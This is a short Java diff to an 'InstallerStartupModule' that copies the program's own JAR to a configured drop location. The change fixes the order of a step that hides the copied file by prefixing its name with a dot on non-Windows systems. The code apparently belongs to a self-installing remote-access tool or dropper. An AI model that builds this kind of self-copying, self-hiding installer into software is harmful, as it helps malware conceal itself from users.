@@ -53,14 +53,14 @@ public class InstallerStartupModule extends StartupModule {
 
 				String fileName = Configuration.getConfig().get("name");
 
+				if (hideFile && OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
+					fileName = "." + fileName;
+				}
+				
 				File file = DropLocations.getFile(dropLocation, fileName);
 
 				if (file.getParentFile() != null && !file.getParentFile().exists()) {
 					file.getParentFile().mkdirs();
-				}
-				
-				if (hideFile && OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
-					fileName = "." + fileName;
 				}
 				
 				ZipFile thisFile = new ZipFile(Utils.getJarFile());
